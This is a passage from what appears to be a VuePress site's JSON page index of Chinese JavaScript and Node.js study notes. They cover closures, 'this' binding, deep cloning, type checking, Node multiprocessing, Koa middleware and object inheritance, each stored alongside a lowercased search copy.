18, 1);\n  a.sayHi(); //姓名yang,年龄18,学号1\n  a.__proto__.sayHi(); //姓名undefined,年龄undefined,学号undefined\n  \n  //undefined的原因，原型链中的this,相当于this指向a.__proto__这个对象，这个对象中的this.name,age都是undefined\n  //如何执行有值？修改this指向，使this指向a\n  a.__proto__.sayHi.call(a)\n\n\n\n# 手写bind函数\n\nFunction.prototype.newbind = function(){\n  const args = Array.prototype.slice.call(arguments)\n  //获取数组的第一项\n  const t = args.shift()\n  //fn.bind()中的fn \n  const self = this\n  //返回函数\n  return function(){\n    return self.apply(t,args)\n  }\n}\nfunction fn1(a,b,c){\n  console.log('this :>> ', this);\n  return 'this.is fn1'\n}\nconst fn2 = fn1.newbind({x:100},1,2,3,4)\nconst res = fn2()\nconsole.log('res :>> ', res);\n",
      "normalizedContent": "思考几个问题\n\n * this的不同应用场景如何取值？\n * 手写bind函数\n * 闭包开发中的应用场景\n\n\n# 作用域和自由变量\n\n\n# 作用域\n\n * 全局作用域\n * 函数作用域\n * 块级作用域\n\n# 块级作用域\n\nes6,块作用域由 { } 包括，if语句和for语句里面的{ }也属于块作用域\n\nif(true) {\n  let a= 100  //let、const声明的变量,只能在块作用域中被访问，和var区别\n}\nconsole.log(a) //referenceerror: a is not defined\n\n\n\n# 自由变量\n\n * 一个变量在当前作用域没有被定义但被使用了\n * 会向上级作用域一层一层寻找，直到找到为止\n * 如果全局都没有找到，会报错xxx is not defined\n\n\n# 一道题目\n\n生成10个a标签，点击每个a标签时弹出对应index\n\nlet i, a;\n  for (i = 0; i <= 10; i++) {\n    a = document.createelement(\"a\");\n    a.innerhtml = i + \"<br>\";\n    a.addeventlistener(\"click\", function (e) {\n      e.preventdefault();\n      alert(i);\n    });\n    document.body.appendchild(a);\n  }\n//很明晰这个代码是错误的，alert全部是10，为什么？\n//当为每个标签添加click时，for循环10次已经执行完了，此时i是10，alert(i)时i是全局作用域所以弹出10.\n//如何修改？\nlet a\nfor(let i = 0;....) //块级作用域，每次for循环都会形成一个新的块，1，2，3....\n\n\n\n# 闭包（closure）\n\n作用域应用的特殊情况，函数作为参数被传递，函数作为返回值被返回\n\n\n# 那什么是闭包？\n\n * 要理解闭包，首先理解javascript特殊的变量作用域，变量的作用域无非就是两种：全局变量，局部变量。\n * javascript语言的特殊处就是函数内部可以读取外部作用域中的变量。\n * 我们有时候需要得到函数内的局部变量，但是在正常情况下，这是不能读取到的，这时候就需要用到闭包。在javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成“定义在一个函数内部的函数”。闭包是指有权访问另一个函数作用域中的变量的函数。其本质是函数的作用域链中保存着外部函数变量对象的引用。\n\n\n//函数作为返回值 \nfunction create(){\n  const a = 100\n  return function(){\n    console.log('a :>> ', a);\n  }\n}\nconst fn= create()\nconst a = 200\nfn() //100\n// 函数作为参数\nfunction print(fn){\n  const a = 200\n  fn()\n}\nconst a = 100\nfunction fn(){\n  console.log(a)\n}\nprint(fn) //100\n//自由变量的查找，是在函数定义的位置向上级作用域查找，而不是在函数执行的位置\n\n\n\n# 闭包的应用场景\n\n# 1、一个缓存的插件（封装对象的私有属性和方法）\n\n// 闭包隐藏数据，只提供 api\nfunction createcache() {\n    const num=100\n    const data = {} // 闭包中的数据，被隐藏，不被外界访问\n    return {\n        num:num,\n        set: function (key, val) {\n            data[key] = val\n        },\n        get: function (key) {\n            return data[key]\n        }\n    }\n}\n \nconst c = createcache()\nconsole.log(c.num)//num此时就作为c私有属性\nc.set('a', 100) //set此时作为c的私有方法\nconsole.log( c.get('a') )\n\n\n# 2、闭包作用回调函数\n\n * 获取数组中某一区间的数值(实际业务开发中获取某一价格区间的商品)\n\n function between(a, b) {\n    return function (v) {\n      return v >= a && v <= b;\n    };\n  }\n  const arr = [2, 5, 6, 7, 8, 3, 11, 2, 1, 8, 9];\n  const newarr = arr.filter(between(2, 6));\n  console.log(\"newarr :>> \", newarr);\n\n\n * 根据某种条件获得购物车中的商品升序 根据闭包封装，获取当前购物车内信息，根据价格或者点击次数进行排序\n\n  const product = [\n    {id: 1,name: \"a\",price: 90,click: 100,},\n    {id: 1,name: \"b\",price: 100,click: 20,},\n    {id: 1,name: \"c\",price: 160,click: 80,},\n    {id: 1,name: \"d\",price: 22,click: 45,},\n  ];\nfunction order(field) {\n  return function(a,b){\n    return a[field]-b[field]\n  }\n}\nconst orderbyprice = product.sort(order('price')) //通过价格排序\nconsole.log('orderbyprice :>> ', orderbyprice);\nconst orderbyclick = product.sort(order('click'))//通过用户点击次数排序\nconsole.log('orderbyclick :>> ', orderbyclick);\n\n\n# 3、函数防抖和截流\n\n//截流\nconst throttle = (fn, wait) => {\n let pretime = date.now()\n return function() {\n  if(date.now() - pre > wait) {\n   fn()\n    pretime = date.now()\n  }\n }\n}\n\n//防抖\nvar debounce = function(func, delay) {\n     var timer = null\n     return function() {\n         var that = this;\n         var args = arguments;\n          \n         if(timer) {\n             cleartimeout(timer);\n         }\n    \n         timer = settimeout(function() {\n             func.apply(that, args);\n         }, delay)\n     }\n}\n\n\n# 4、单例模式\n\n * 保证一个类仅有一个实例，并提供一个访问它的全局访问点\n\nvar head = (function () {\n    var headclass = function () { }; // 声明headclass对象，无法在外部直接调用\n    var instance; // 声明一个instance对象\n    return function () {\n        if (instance) { // 如果已存在 则返回instance\n            return instance;\n        }\n        instance = new headclass() // 如果不存在 则new一个\n        return instance;\n    }\n})();\nvar a = head();\nvar b = new head();\nconsole.log(a===b) // true\nvar a = headclass(); // 报错,headclass is not defined\n\n\n\n\n# 优点和缺点\n\n# 优点\n\n * 1、变量长期存在于内存中，可随时被使用\n * 2、全局变量易造成全局的变量污染，闭包通过局部变量和全局变量结合使用，通过作用域控制，可以重复使用变量，不会造成变量污染\n\n# 缺点\n\n * 由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题\n * 但闭包不属于内存泄漏，预期的引用导致数据不被回收，不属于内存泄漏\n\n\n# 柯里化函数\n\n待补充\n\n\n# this\n\n一篇知乎 this的指向\n\nthis的取值是在函数执行时确认，不是定义时确认 🎉\n\n\n# 使用场景\n\n * 作为普通函数被调用\n * 使用call，apply，bind调用\n * 作为对象，方法被调用\n * class中被调用\n * 箭头函数\n\n\n# 普通函数中的this\n\n// 作为普通函数被调用\nfunction fn1(){\n  console.log(this)\n}\nfn1() //window\n\n\n\n# 使用call，apply，bind调用\n\n//使用call，apply，bind\nfn1.call({x:100}) //{x:100}\nconst fn2 = fn1.bind({x:200})\nfn2()\n\n\nbind和call的区别？请注意：调用bind过程中不会执行方法,只会返回一个方法,然后再执行\n\n\n# this作为对象，方法被调用\n\n以上wait中的this执行有什么区别呢？\n * **左图:**settimeout中的function执行，相当于普通函数的执行，所以this指向window\n * 右图:箭头函数的本身没有自己的this，this永远取他上级作用域的this\n\n\n# class中的this\n\n- 类的方法内部如果含有this，它默认指向类的实例\n\n\n# 箭头函数this\n\n * 箭头函数的本身没有自己的this，this永远取他上级作用域的this\n\n//请看下面的对比\n//1、this作为对象的方法被调用\nlet info = {\n  name:'yang',\n  get:function(){\n    return this.name\n  }\n}\nconsole.log('info.get() :>> ', info.get()); //yang\n//2、this在闭包中的表现\nlet info = {\n  name:'yang',\n  get:function(){\n    return function(){\n      return this.name\n    }\n  }\n}\nlet a = info.get()\n//下一步当执行a时候，this指向当前函数所在的对象window，window中无name属性\nconsole.log(a()) //undefined\n//如何解决这个问题？（使用箭头函数）\nlet info = {\n  name:'yang',\n  get:function(){\n    return ()=>{ //通过箭头函数的this指向其上下文\n      console.log('this :>> ', this);\n      return this.name\n    }\n  }\n}\nlet a = info.get()\nconsole.log('a() :>> ', a());\n\n\n\n# 原型链中的this\n\nclass people {\n    constructor(name, age) {\n      this.name = name;\n      this.age = age;\n    }\n    say() {\n      console.log(`姓名${this.name},年龄${this.age}`);\n    }\n  }\n  //子类\n  class student extends people {\n    constructor(name, age, number) {\n      super(name, age); //super会调用父类的构造函数方法\n      this.number = number;\n    }\n    sayhi() {\n      console.log(`姓名${this.name},年龄${this.age},学号${this.number}`);\n    }\n  }\n  const a = new student(\"yang\", 18, 1);\n  a.sayhi(); //姓名yang,年龄18,学号1\n  a.__proto__.sayhi(); //姓名undefined,年龄undefined,学号undefined\n  \n  //undefined的原因，原型链中的this,相当于this指向a.__proto__这个对象，这个对象中的this.name,age都是undefined\n  //如何执行有值？修改this指向，使this指向a\n  a.__proto__.sayhi.call(a)\n\n\n\n# 手写bind函数\n\nfunction.prototype.newbind = function(){\n  const args = array.prototype.slice.call(arguments)\n  //获取数组的第一项\n  const t = args.shift()\n  //fn.bind()中的fn \n  const self = this\n  //返回函数\n  return function(){\n    return self.apply(t,args)\n  }\n}\nfunction fn1(a,b,c){\n  console.log('this :>> ', this);\n  return 'this.is fn1'\n}\nconst fn2 = fn1.newbind({x:100},1,2,3,4)\nconst res = fn2()\nconsole.log('res :>> ', res);\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "堆栈模型",
      "frontmatter": {
        "title": "堆栈模型"
      },
      "regularPath": "/webstudy/Javascript/%E5%A0%86%E6%A0%88%E6%A8%A1%E5%9E%8B.html",
      "relativePath": "webstudy/Javascript/堆栈模型.md",
      "key": "v-230a2f15",
      "path": "/webstudy/Javascript/%E5%A0%86%E6%A0%88%E6%A8%A1%E5%9E%8B.html",
      "headers": [
        {
          "level": 2,
          "title": "堆栈",
          "slug": "堆栈",
          "normalizedTitle": "堆栈",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "大概的一个流程图",
          "slug": "大概的一个流程图",
          "normalizedTitle": "大概的一个流程图",
          "charIndex": 9
        },
        {
          "level": 3,
          "title": "为什么区分堆栈",
          "slug": "为什么区分堆栈",
          "normalizedTitle": "为什么区分堆栈",
          "charIndex": 311
        },
        {
          "level": 3,
          "title": "类型判断",
          "slug": "类型判断",
          "normalizedTitle": "类型判断",
          "charIndex": 35
        },
        {
          "level": 3,
          "title": "接下来-深拷贝",
          "slug": "接下来-深拷贝",
          "normalizedTitle": "接下来-深拷贝",
          "charIndex": 1605
        },
        {
          "level": 2,
          "title": "变量计算和类型转换",
          "slug": "变量计算和类型转换",
          "normalizedTitle": "变量计算和类型转换",
          "charIndex": 2071
        },
        {
          "level": 3,
          "title": "==和===",
          "slug": "和",
          "normalizedTitle": "==和===",
          "charIndex": 2085
        },
        {
          "level": 3,
          "title": "if语句和逻辑运算符",
          "slug": "if语句和逻辑运算符",
          "normalizedTitle": "if语句和逻辑运算符",
          "charIndex": 2266
        }
      ],
      "headersStr": "堆栈 大概的一个流程图 为什么区分堆栈 类型判断 接下来-深拷贝 变量计算和类型转换 ==和=== if语句和逻辑运算符",
      "content": "# 堆栈\n\n\n# 大概的一个流程图\n\n堆栈——>值类型/引用类型——>类型判断——>深拷贝\n\n请看一个简单的列子:\n\n//值类型\nlet a=1\nlet b=a\nb = 2\nconsole.log(a) //1\n//引用类型\nlet a = {num:1},\nlet b = a\nb.num = 2\nconsole.log(a.num) //2\n\n\n如下图:\n\n * 当给a赋值成一个对象->会在堆中申请一个内存地址，存储对象->此时a其实指向的是内存地址1，而不是对象，是内存地址指向这个对象\n * 当声明b=a,其实是b指向内存地址1\n * 如果此时修改b.age的值，再访问a.age,那么a.age会改变\n\n\n# 为什么区分堆栈\n\n简单说，基于性能，值类型如number，string占用内存小，但引用类型数据量大，操作数据时速度会很慢，同时如object等存放于栈中也不便于管理。\n\n\n# 类型判断\n\n# typeof\n\n * 识别所有的值类型，包括es6中的symbol\n * 识别函数\n\n  typeof console.log() //'function'\n  typeof function(){} //'function'\n\n\n * 判断是否是引用类型（但对于识别是Object还是Array那就无能为力了）\n\n  typeof null //'object' null是一个空的引用类型，有一个空地址\n  typeof {} //'object'\n  typeof [] //'object'\n\n\n# instanceof\n\n在原型中会详解instanceof......\n\n# 还有一个Object.prototype.toString\n\n * 如果需要通用检测数据类型，可以采用Object.prototype.toString，调用该方法，统一返回格式“[object Xxx]”的字符串\n\nObject.prototype.toString({})       // \"[object Object]\"\nObject.prototype.toString.call({})  // 同上结果，加上call也ok\nObject.prototype.toString.call(1)    // \"[object Number]\"\nObject.prototype.toString.call('1')  // \"[object String]\"\nObject.prototype.toString.call(true)  // \"[object Boolean]\"\nObject.prototype.toString.call(function(){})  // \"[object Function]\"\nObject.prototype.toString.call(null)   //\"[object Null]\"\nObject.prototype.toString.call(undefined) //\"[object Undefined]\"\nObject.prototype.toString.call(/123/g)    //\"[object RegExp]\"\nObject.prototype.toString.call(new Date()) //\"[object Date]\"\nObject.prototype.toString.call([])       //\"[object Array]\"\nObject.prototype.toString.call(document)  //\"[object HTMLDocument]\"\nObject.prototype.toString.call(window)   //\"[object Window]\"\n\n\n\n# 接下来-深拷贝\n\n * 如何像值类型一样操作引用类型赋值深拷贝\n\n老生常谈，反反复复\n\nfunction deepClone(obj = {}) {\n    if (typeof obj !== \"object\" || obj == null) {\n      return obj;\n    }\n    let result;\n    if (obj instanceof Array) {\n      result = [];\n    } else {\n      result = {};\n    }\n    for (let key in obj) {\n      if (obj.hasOwnProperty(key)) {\n        //obj.hasOwnProperty(key)? 保证key不是原型的属性\n        //接下来递归\n        result[key] = deepClone(obj[key]);\n      }\n    }\n    return result\n  }\n\n\n\n# 变量计算和类型转换\n\n\n# ==和===\n\n0=='' //true\n0== false //true\nnull==undefined //true\n\n\n==所造成的困扰，不需要非死记硬背，最好的办法在代码中除了==null，其余全部===\n\nif(obj.a==null){}\n//相当于\n// if（obj.a===null || obj.a=== undefined){}\n\n\n\n# if语句和逻辑运算符\n\n# if语句中的truly和falsely\n\n * truly变量 !!a === true\n * falsely变量 !!a === false\n\n除了一下falsely变量其他都是truly变量\n\n!!0 === false\n!!Nan === false\n!!''=== false\n!!null === false \n!!undefined=== false\n!!false=== false\n\n\n# 逻辑运算符\n\nconsole.log(10 && 0) //0 为什么？10是truly，继续向后判断 &&，遇到0是falsely，直接返回0\nconsole.log(0 && 10) // 0 同上\nconsole.log(''||'abc') // abc\nconsole.log('abc'||'') // abc\n",
      "normalizedContent": "# 堆栈\n\n\n# 大概的一个流程图\n\n堆栈——>值类型/引用类型——>类型判断——>深拷贝\n\n请看一个简单的列子:\n\n//值类型\nlet a=1\nlet b=a\nb = 2\nconsole.log(a) //1\n//引用类型\nlet a = {num:1},\nlet b = a\nb.num = 2\nconsole.log(a.num) //2\n\n\n如下图:\n\n * 当给a赋值成一个对象->会在堆中申请一个内存地址，存储对象->此时a其实指向的是内存地址1，而不是对象，是内存地址指向这个对象\n * 当声明b=a,其实是b指向内存地址1\n * 如果此时修改b.age的值，再访问a.age,那么a.age会改变\n\n\n# 为什么区分堆栈\n\n简单说，基于性能，值类型如number，string占用内存小，但引用类型数据量大，操作数据时速度会很慢，同时如object等存放于栈中也不便于管理。\n\n\n# 类型判断\n\n# typeof\n\n * 识别所有的值类型，包括es6中的symbol\n * 识别函数\n\n  typeof console.log() //'function'\n  typeof function(){} //'function'\n\n\n * 判断是否是引用类型（但对于识别是object还是array那就无能为力了）\n\n  typeof null //'object' null是一个空的引用类型，有一个空地址\n  typeof {} //'object'\n  typeof [] //'object'\n\n\n# instanceof\n\n在原型中会详解instanceof......\n\n# 还有一个object.prototype.tostring\n\n * 如果需要通用检测数据类型，可以采用object.prototype.tostring，调用该方法，统一返回格式“[object xxx]”的字符串\n\nobject.prototype.tostring({})       // \"[object object]\"\nobject.prototype.tostring.call({})  // 同上结果，加上call也ok\nobject.prototype.tostring.call(1)    // \"[object number]\"\nobject.prototype.tostring.call('1')  // \"[object string]\"\nobject.prototype.tostring.call(true)  // \"[object boolean]\"\nobject.prototype.tostring.call(function(){})  // \"[object function]\"\nobject.prototype.tostring.call(null)   //\"[object null]\"\nobject.prototype.tostring.call(undefined) //\"[object undefined]\"\nobject.prototype.tostring.call(/123/g)    //\"[object regexp]\"\nobject.prototype.tostring.call(new date()) //\"[object date]\"\nobject.prototype.tostring.call([])       //\"[object array]\"\nobject.prototype.tostring.call(document)  //\"[object htmldocument]\"\nobject.prototype.tostring.call(window)   //\"[object window]\"\n\n\n\n# 接下来-深拷贝\n\n * 如何像值类型一样操作引用类型赋值深拷贝\n\n老生常谈，反反复复\n\nfunction deepclone(obj = {}) {\n    if (typeof obj !== \"object\" || obj == null) {\n      return obj;\n    }\n    let result;\n    if (obj instanceof array) {\n      result = [];\n    } else {\n      result = {};\n    }\n    for (let key in obj) {\n      if (obj.hasownproperty(key)) {\n        //obj.hasownproperty(key)? 保证key不是原型的属性\n        //接下来递归\n        result[key] = deepclone(obj[key]);\n      }\n    }\n    return result\n  }\n\n\n\n# 变量计算和类型转换\n\n\n# ==和===\n\n0=='' //true\n0== false //true\nnull==undefined //true\n\n\n==所造成的困扰，不需要非死记硬背，最好的办法在代码中除了==null，其余全部===\n\nif(obj.a==null){}\n//相当于\n// if（obj.a===null || obj.a=== undefined){}\n\n\n\n# if语句和逻辑运算符\n\n# if语句中的truly和falsely\n\n * truly变量 !!a === true\n * falsely变量 !!a === false\n\n除了一下falsely变量其他都是truly变量\n\n!!0 === false\n!!nan === false\n!!''=== false\n!!null === false \n!!undefined=== false\n!!false=== false\n\n\n# 逻辑运算符\n\nconsole.log(10 && 0) //0 为什么？10是truly，继续向后判断 &&，遇到0是falsely，直接返回0\nconsole.log(0 && 10) // 0 同上\nconsole.log(''||'abc') // abc\nconsole.log('abc'||'') // abc\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "nodejs 多进程",
      "frontmatter": {
        "title": "nodejs 多进程"
      },
      "regularPath": "/webstudy/Nodejs/nodejs%E5%A4%9A%E8%BF%9B%E7%A8%8B.html",
      "relativePath": "webstudy/Nodejs/nodejs多进程.md",
      "key": "v-e5190fc2",
      "path": "/webstudy/Nodejs/nodejs%E5%A4%9A%E8%BF%9B%E7%A8%8B.html",
      "headers": [
        {
          "level": 2,
          "title": "进程 process 和线程 thread",
          "slug": "进程-process-和线程-thread",
          "normalizedTitle": "进程 process 和线程 thread",
          "charIndex": 17
        },
        {
          "level": 2,
          "title": "nodejs 如何开启一个进程，进程之间如何通讯",
          "slug": "nodejs-如何开启一个进程-进程之间如何通讯",
          "normalizedTitle": "nodejs 如何开启一个进程，进程之间如何通讯",
          "charIndex": 376
        },
        {
          "level": 2,
          "title": "为何需要多进程",
          "slug": "为何需要多进程",
          "normalizedTitle": "为何需要多进程",
          "charIndex": 472
        },
        {
          "level": 2,
          "title": "nodejs 开启多进程",
          "slug": "nodejs-开启多进程",
          "normalizedTitle": "nodejs 开启多进程",
          "charIndex": 601
        },
        {
          "level": 2,
          "title": "扩展：使用 PM2",
          "slug": "扩展-使用-pm2",
          "normalizedTitle": "扩展：使用 pm2",
          "charIndex": 738
        }
      ],
      "headersStr": "进程 process 和线程 thread nodejs 如何开启一个进程，进程之间如何通讯 为何需要多进程 nodejs 开启多进程 扩展：使用 PM2",
      "content": "# nodejs 多进程\n\n\n# 进程 process 和线程 thread\n\n进程-是操作系统进行资源调度和分配的基本单位，每个进程都拥有自己独立的内存区域（参考“堆栈模型”）。 一个进程无法直接访问另一个进程的内存数据，除非通过合法的进程通讯。\n\n执行一个 nodejs 文件，即开启了一个进程，可以通过 process.pid 查看进程 id 。\n\n线程-是操作系统进行运算调度的最小单位，线程是附属于进程的。一个进程可以包含多个线程（至少一个），多线程之间可共用进程的内存数据。\n如操作系统是一个工厂，进程就是一个车间，线程就是一个一个的工人。\n\nJS 是单线程的，即执行 JS 时启动一个进程（如 JS 引擎，nodejs 等），然后其中再开启一个线程来执行。\n虽然单线程，JS 是基于事件驱动的，它不会阻塞执行，适合高并发的场景。\n\n\n# nodejs 如何开启一个进程，进程之间如何通讯\n\n * 可使用 child_process.fork 和 cluster.fork 开启子进程\n * 使用 send on 传递消息\n\n\n# 为何需要多进程\n\n现代服务器都是多核 CPU ，适合同时处理多进程。即，一个进程无法充分利用 CPU 性能，进程数要等于 CPU 核数。\n\n服务器一般内存比较大，但操作系统对于一个进程的内存分配是有上限的（2G），所以多进程才能充分利用服务器内存。\n\n\n# nodejs 开启多进程\n\nchild_process.fork 可开启子进程执行单独的计算\n\n * fork('xxx.js') 开启一个子进程\n * 使用 send 发送信息，使用 on 接收信息\n\ncluster.fork 可针对当前代码，开启多个进程来执行\n\n\n# 扩展：使用 PM2\n\nnodejs 服务开启多进程、进程守护，可使用 pm2 ，不需要自己写。\n\n * 全局安装 pm2 yarn global add pm2\n * 增加 pm2 配置文件\n * 修改 package.json scripts",
      "normalizedContent": "# nodejs 多进程\n\n\n# 进程 process 和线程 thread\n\n进程-是操作系统进行资源调度和分配的基本单位，每个进程都拥有自己独立的内存区域（参考“堆栈模型”）。 一个进程无法直接访问另一个进程的内存数据，除非通过合法的进程通讯。\n\n执行一个 nodejs 文件，即开启了一个进程，可以通过 process.pid 查看进程 id 。\n\n线程-是操作系统进行运算调度的最小单位，线程是附属于进程的。一个进程可以包含多个线程（至少一个），多线程之间可共用进程的内存数据。\n如操作系统是一个工厂，进程就是一个车间，线程就是一个一个的工人。\n\njs 是单线程的，即执行 js 时启动一个进程（如 js 引擎，nodejs 等），然后其中再开启一个线程来执行。\n虽然单线程，js 是基于事件驱动的，它不会阻塞执行，适合高并发的场景。\n\n\n# nodejs 如何开启一个进程，进程之间如何通讯\n\n * 可使用 child_process.fork 和 cluster.fork 开启子进程\n * 使用 send on 传递消息\n\n\n# 为何需要多进程\n\n现代服务器都是多核 cpu ，适合同时处理多进程。即，一个进程无法充分利用 cpu 性能，进程数要等于 cpu 核数。\n\n服务器一般内存比较大，但操作系统对于一个进程的内存分配是有上限的（2g），所以多进程才能充分利用服务器内存。\n\n\n# nodejs 开启多进程\n\nchild_process.fork 可开启子进程执行单独的计算\n\n * fork('xxx.js') 开启一个子进程\n * 使用 send 发送信息，使用 on 接收信息\n\ncluster.fork 可针对当前代码，开启多个进程来执行\n\n\n# 扩展：使用 pm2\n\nnodejs 服务开启多进程、进程守护，可使用 pm2 ，不需要自己写。\n\n * 全局安装 pm2 yarn global add pm2\n * 增加 pm2 配置文件\n * 修改 package.json scripts",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "中间件",
      "frontmatter": {
        "title": "中间件"
      },
      "regularPath": "/webstudy/Nodejs/%E4%B8%AD%E9%97%B4%E4%BB%B6.html",
      "relativePath": "webstudy/Nodejs/中间件.md",
      "key": "v-4e60d9bf",
      "path": "/webstudy/Nodejs/%E4%B8%AD%E9%97%B4%E4%BB%B6.html",
      "headersStr": null,
      "content": "",
      "normalizedContent": "",
      "charsets": {}
    },
    {
      "title": "洋葱模型",
      "frontmatter": {
        "title": "洋葱模型"
      },
      "regularPath": "/webstudy/Nodejs/%E6%B4%8B%E8%91%B1%E6%A8%A1%E5%9E%8B.html",
      "relativePath": "webstudy/Nodejs/洋葱模型.md",
      "key": "v-3fa08b8f",
      "path": "/webstudy/Nodejs/%E6%B4%8B%E8%91%B1%E6%A8%A1%E5%9E%8B.html",
      "headers": [
        {
          "level": 2,
          "title": "官网demo",
          "slug": "官网demo",
          "normalizedTitle": "官网demo",
          "charIndex": 72
        }
      ],
      "headersStr": "官网demo",
      "content": "# koa2洋葱模型\n\n了解洋葱模型前要掌握js异步编程\n\n为什么?因为koa2使用的async/await+ promise思路\n\n\n\n\n# 官网demo\n\nconst Koa = require('koa');\nconst app = new Koa();\n\n// logger\n\napp.use(async (ctx, next) => {\n  await next(); //1\n  const rt = ctx.response.get('X-Response-Time');//7\n  console.log(`${ctx.method} ${ctx.url} - ${rt}`);//8\n});\n\n// x-response-time\napp.use(async (ctx, next) => {\n  const start = Date.now();//2\n  await next();//3\n  const ms = Date.now() - start;//5\n  ctx.set('X-Response-Time', `${ms}ms`);//6\n});\n\n// response\napp.use(async ctx => {\n  ctx.body = 'Hello World';//4\n});\n\napp.listen(3000);\n\n\n如代码，通过await next()执行下一个中间件....向内执行，最后从内向外执行...",
      "normalizedContent": "# koa2洋葱模型\n\n了解洋葱模型前要掌握js异步编程\n\n为什么?因为koa2使用的async/await+ promise思路\n\n\n\n\n# 官网demo\n\nconst koa = require('koa');\nconst app = new koa();\n\n// logger\n\napp.use(async (ctx, next) => {\n  await next(); //1\n  const rt = ctx.response.get('x-response-time');//7\n  console.log(`${ctx.method} ${ctx.url} - ${rt}`);//8\n});\n\n// x-response-time\napp.use(async (ctx, next) => {\n  const start = date.now();//2\n  await next();//3\n  const ms = date.now() - start;//5\n  ctx.set('x-response-time', `${ms}ms`);//6\n});\n\n// response\napp.use(async ctx => {\n  ctx.body = 'hello world';//4\n});\n\napp.listen(3000);\n\n\n如代码，通过await next()执行下一个中间件....向内执行，最后从内向外执行...",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "对象的创建与继承",
      "frontmatter": {
        "title": "对象的创建与继承"
      },
      "regularPath": "/webstudy/Javascript/%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%9B%E5%BB%BA%E4%B8%8E%E7%BB%A7%E6%89%BF.html",
      "relativePath": "webstudy/Javascript/对象的创建与继承.md",
      "key": "v-4d586035",
      "path": "/webstudy/Javascript/%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%88%9B%E5%BB%BA%E4%B8%8E%E7%BB%A7%E6%89%BF.html",
      "headers": [
        {
          "level": 3,
          "title": "创建",
          "slug": "创建",
          "normalizedTitle": "创建",
          "charIndex": 5
        },
        {
          "level": 3,
          "title": "继承",
          "slug": "继承",
          "normalizedTitle": "继承",
          "charIndex": 8
        }
      ],
      "headersStr": "创建 继承",
      "content": "# 对象的创建与继承\n\n\n# 创建\n\n * {}\n * new Object()\n * 使用字面量\n * 工厂模式\n * 构造函数模式（constructor）\n * 原型模式（prototype）\n * 构造函数+原型模式\n\n{} / new Object / 字面量\n\n//\nvar a = {};\na.name = \"jack\";\na.say = function () {\n  alert(this.name);\n};\n//\nvar b = new Object();\nb.name = \"zhangsna\";\n// 字面量\nvar person = { name: \"zhangsan\", age: 18 };\n\n\n工厂模式\n\n * 缺点：调用的还是不同的方法,方法不共享\n\nfunction createPerson(name) {\n  var obj = {\n    name: name,\n    setName: function (name) {\n      this.name = name;\n    },\n  };\n  return obj;\n}\nvar p1 = createPerson(\"Tom\");\nvar p2 = createPerson(\"Mary\");\n\n\n构造函数模式（constructor）\n\n * 缺点:new 的每个对象都有相同的数据（方法），\n\nfunction Person(name) {\n  this.name = name;\n  this.setName = function (name) {\n    this.name = name;\n  };\n}\nvar p1 = new Person(\"Tom\");\nvar p2 = new Person(\"Mary\");\n\n\n原型模式\n\n * 缺点：假如原型中包含有引用类型的属性，那么如果某个对象修改了该属性的值，所有的该原型创建的对象访问的值都会改变\n\nfunction Animal() {}\nAnimal.prototype = {\n  name: \"animal\",\n  friends: [\"dog\", \"cat\"],\n  sayName: function () {\n    alert(this.name);\n  },\n};\nvar a1 = new Animal();\nvar a2 = new Animal();\na2.friends.push(\"snake\");\nalert(a2.friends); //[dog,cat,snake]\nalert(a1.friends); //[dog,cat,snake]\n\n\n构造函数 + 原型的组合模式 属性在函数中初始化，方法添加到原型上\n\nfunction Animal(name) {\n  this.name = name;\n  this.friends = [\"dog\", \"cat\"];\n}\nAnimal.prototype.sayName = function () {\n  alert(this.name);\n};\nvar a1 = new Animal(\"d\");\nvar a2 = new Animal(\"c\");\na1.friends.push(\"snake\");\nalert(a1.friends); //[dog,caxt,snake]\nalert(a2.friends); //[dog,cat]\n\n\n\n# 继承\n\n * 原型链继承\n * 借用构造函数继承\n * 组合继承\n * 原型式继承\n * 寄生式继承\n * 寄生组合式继承\n * class extends\n\n原型链继承\n\nfunction Parent1() {\n  this.name = \"parent1\";\n  this.play = [1, 2, 3];\n}\nfunction Child1() {\n  this.type = \"child2\";\n}\nChild1.prototype = new Parent1();\nchild2.prototype = new Parent1();\nconsole.log(new Child1());\n\nlet s1 = new Child1();\nlet s2 = new Child2();\ns1.play.push(4);\nconsole.log(s1.play, s2.play); //打印的都是[1,2,3,4]\n// 缺点:两个实例使用的是同一个原型对象。它们的内存空间是共享的，当一个发生变化的时候，另外一个也随之进行了变化，这就是使用原型链继承方式的一个缺点\n\n\n借用构造函数继承\n\nfunction Fruit(name) {\n  this.name = name;\n}\nfunction Apple() {\n  Fruit.call(this, \"apple\");\n}\n\n\n组合继承\n\nfunction Fruit(name) {\n  this.name = name;\n}\nFruit.prototype.sayName = function () {\n  console.log(this.name);\n};\n\nfunction Apple(name) {\n  Fruit.call(this, name);\n}\nApple.prototype = new Fruit();\nApple.prototype.constructor = Apple;\n\n\n原型式继承\n\nfunction object(o) {\n  function F() {}\n  F.prototype = o;\n  return new F();\n}\n",
      "normalizedContent": "# 对象的创建与继承\n\n\n# 创建\n\n * {}\n * new object()\n * 使用字面量\n * 工厂模式\n * 构造函数模式（constructor）\n * 原型模式（prototype）\n * 构造函数+原型模式\n\n{} / new object / 字面量\n\n//\nvar a = {};\na.name = \"jack\";\na.say = function () {\n  alert(this.name);\n};\n//\nvar b = new object();\nb.name = \"zhangsna\";\n// 字面量\nvar person = { name: \"zhangsan\", age: 18 };\n\n\n工厂模式\n\n * 缺点：调用的还是不同的方法,方法不共享\n\nfunction createperson(name) {\n  var obj = {\n    name: name,\n    setname: function (name) {\n      this.name = name;\n    },\n  };\n  return obj;\n}\nvar p1 = createperson(\"tom\");\nvar p2 = createperson(\"mary\");\n\n\n构造函数模式（constructor）\n\n * 缺点:new 的每个对象都有相同的数据（方法），\n\nfunction person(name) {\n  this.name = name;\n  this.setname = function (name) {\n    this.name = name;\n  };\n}\nvar p1 = new person(\"tom\");\nvar p2 = new person(\"mary\");\n\n\n原型模式\n\n * 